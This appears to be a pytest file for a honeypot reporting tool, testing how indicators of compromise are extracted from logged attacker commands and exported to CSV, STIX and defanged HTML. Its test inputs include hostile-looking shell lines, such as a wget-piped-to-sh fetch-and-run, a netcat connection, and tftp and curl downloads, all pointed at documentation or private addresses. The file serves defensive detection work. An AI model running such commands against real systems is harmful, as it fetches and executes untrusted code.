"""IOCs pulled from attacker command text, scp upload paths, and the IOC exports."""

import csv
import io
import json
import re
import sys
from datetime import UTC, datetime
from pathlib import Path

import psycopg
import pytest

from honeylens.config import parse_networks
from honeylens.reporting import exports, iocs
from honeylens.reporting.data import load
from honeylens.reporting.render import render_html
from tests.conftest import ROOT, role_dsn
from tests.real_fixtures import DROPPER, SCP_UPLOAD_CMD, SCP_UPLOAD_PATH
from tests.test_pipeline_db import ev, make_pipeline

sys.path.insert(0, str(ROOT / "scripts"))
import validate_stix  # noqa: E402

SHA = "a" * 64


# ------------------------------------------------------------------ unit
def test_dropper_command_yields_url_scp_and_ip():
    found = iocs.extract(DROPPER)
    assert ("url", "https://192.0.2.5/sh") in found
    assert ("scp-target", "dlr@192.0.2.5:sh") in found
    assert ("ipv4-addr", "192.0.2.5") in found


@pytest.mark.parametrize("cmd", [
    "wget http://10.1.2.3/x", "curl http://127.0.0.1:8080/a", "ping 192.168.1.1", "nc 172.16.0.9 4444",
    "echo 169.254.169.254", "echo 0.0.0.0", "echo 224.0.0.251", "echo 100.64.1.1", "echo 999.1.1.1",
])
def test_private_reserved_and_invalid_are_skipped(cmd):
    assert [f for f in iocs.extract(cmd) if f[0] in ("ipv4-addr", "url")] == []


def test_public_and_documentation_ips_kept_and_exclusions_applied():
    assert iocs.extract("tftp -g -r mips 203.0.113.9") == [("ipv4-addr", "203.0.113.9")]
    assert iocs.extract("ping 8.8.8.8") == [("ipv4-addr", "8.8.8.8")]
    excl = parse_networks("203.0.113.0/24, 8.8.8.8")
    assert iocs.extract("tftp -g -r mips 203.0.113.9; ping 8.8.8.8", excl) == []
    # a URL whose host is excluded is dropped too
    assert iocs.extract("wget http://203.0.113.9/x", excl) == []


def test_url_schemes_and_trailing_punctuation():
    found = iocs.extract("tftp://198.51.100.3/m, ftp://files.example.test/a.bin; curl -O https://payload.invalid/x.")
    urls = [v for k, v in found if k == "url"]
    assert urls == ["tftp://198.51.100.3/m", "ftp://files.example.test/a.bin", "https://payload.invalid/x"]


def test_scp_targets_need_scp_context_and_a_dotted_host():
    assert ("scp-target", "bot@dl.example.test:/x86") in iocs.extract("scp -i k bot@dl.example.test:/x86 .")
    assert not [f for f in iocs.extract("echo user@host.example.test:abc") if f[0] == "scp-target"]
    assert not [f for f in iocs.extract("scp -i k bot@localhost:/x .") if f[0] == "scp-target"]


def test_extraction_is_redos_safe():
    import time
    for text in ["http://" + "a" * 4000, "1." * 2000, "scp " + "a@b." * 1000 + ":", "@" * 4096]:
        start = time.perf_counter()
        iocs.extract(text)
        assert time.perf_counter() - start < 0.5


# ------------------------------------------------------------------ database
IGNORED = "198.51.100.200"
SENSOR = "203.0.113.250"
END = datetime(2026, 10, 5, tzinfo=UTC)
TS = "2026-10-04T08:00:00Z"


@pytest.fixture(scope="module")
def ioc_db(migrated, tmp_path_factory):
    with psycopg.connect(migrated["admin"], autocommit=True) as c:
        c.execute("TRUNCATE honeylens.raw_events, honeylens.sessions, honeylens.login_attempts, honeylens.commands, "
                  "honeylens.downloads, honeylens.attack_matches, honeylens.session_summaries, honeylens.ingest_offsets CASCADE")
    folder = tmp_path_factory.mktemp("ioclogs")
    lines = []
    # dropper session (the real one-command dropper, documentation IPs)
    lines += [ev("drop01", "cowrie.session.connect", TS, src_ip="203.0.113.60"),
              ev("drop01", "cowrie.login.success", TS, src_ip="203.0.113.60", username="admin", password="admin"),
              ev("drop01", "cowrie.command.input", TS, src_ip="203.0.113.60", input=DROPPER),
              ev("drop01", "cowrie.command.input", TS, src_ip="203.0.113.60",
                 input=f"ping -c1 10.0.0.1; curl http://{SENSOR}/x; wget http://198.51.100.99/m")]
    # scp upload: Cowrie stores a local path where a URL would be
    lines += [ev("scp01", "cowrie.session.connect", TS, src_ip="203.0.113.61"),
              ev("scp01", "cowrie.login.success", TS, src_ip="203.0.113.61", username="pi", password="raspberry"),
              ev("scp01", "cowrie.command.input", TS, src_ip="203.0.113.61", input=SCP_UPLOAD_CMD),
              ev("scp01", "cowrie.session.file_upload", TS, src_ip="203.0.113.61", url=SCP_UPLOAD_PATH, shasum=SHA,
                 filename="9VyqwU5Z")]
    # the operator's own test session: must vanish from every report/export
    lines += [ev("mine01", "cowrie.session.connect", TS, src_ip=IGNORED),
              ev("mine01", "cowrie.login.success", TS, src_ip=IGNORED, username="root", password="x"),
              ev("mine01", "cowrie.command.input", TS, src_ip=IGNORED, input="wget http://198.51.100.201/mytest.sh | sh")]
    (folder / "cowrie.json").write_text("\n".join(lines) + "\n")
    make_pipeline(migrated, folder, ignore_ips=f"{IGNORED}/32").drain()
    with psycopg.connect(role_dsn(migrated, "hl_report")) as conn:
        data = load(conn, END, 7, "all", exclude_networks=parse_networks(f"{IGNORED},{SENSOR}"))
    return migrated, data


def _csv(d, mask=False):
    return list(csv.DictReader(io.StringIO(exports.to_csv(d, mask))))


@pytest.mark.db
def test_command_iocs_in_csv(ioc_db):
    _, d = ioc_db
    rows = {(r["type"], r["value"]): r for r in _csv(d)}
    assert rows[("url", "https://192.0.2.5/sh")]["context"] == "seen in command (never fetched)"
    assert ("scp-target", "dlr@192.0.2.5:sh") in rows
    assert rows[("ipv4-addr", "192.0.2.5")]["context"] == "seen in command (never fetched)"
    assert ("url", "http://198.51.100.99/m") in rows
    values = " ".join(v for _, v in rows)
    assert "10.0.0.1" not in values  # private range
    assert SENSOR not in values  # the sensor's own IP
    assert IGNORED not in values and "198.51.100.201" not in values  # ignored session and its commands


@pytest.mark.db
def test_scp_upload_path_is_not_a_url(ioc_db):
    _, d = ioc_db
    rows = _csv(d)
    assert not [r for r in rows if r["type"] == "url" and r["value"] == SCP_UPLOAD_PATH]
    paths = [r for r in rows if r["type"] == "file-path"]
    assert [p["value"] for p in paths] == [SCP_UPLOAD_PATH]
    assert [r["value"] for r in rows if r["type"] == "file:sha256"] == [SHA]  # hash kept


@pytest.mark.db
def test_stix_has_command_iocs_and_validates(ioc_db):
    _, d = ioc_db
    for mask in (False, True):
        bundle = exports.to_stix(d, mask)
        validate_stix.validate(json.dumps(bundle))
    patterns = [o["pattern"] for o in exports.to_stix(d)["objects"] if o["type"] == "indicator"]
    assert "[ipv4-addr:value = '192.0.2.5']" in patterns
    assert "[url:value = 'https://192.0.2.5/sh']" in patterns
    assert not any(SCP_UPLOAD_PATH in p for p in patterns)
    masked = json.dumps(exports.to_stix(d, True))
    assert "192.0.2.5" not in masked


@pytest.mark.db
def test_html_defangs_command_iocs(ioc_db):
    _, d = ioc_db
    html = render_html(d)
    assert "hxxps[://]192[.]0[.]2[.]5/sh" in html
    assert "https://192.0.2.5" not in html
    assert SCP_UPLOAD_PATH in html
    assert not re.search(r"198\.51\.100\.200|198\[\.\]51\[\.\]100\[\.\]200", html)


@pytest.mark.db
def test_written_exports_validate_with_scripts(ioc_db, tmp_path):
    from honeylens.reporting.render import write_all
    _, d = ioc_db
    files = write_all(d, tmp_path)
    import validate_navigator
    validate_stix.validate(Path(files["stix"]).read_text())
    assert validate_navigator.validate(json.loads(Path(files["navigator"]).read_text())) > 0
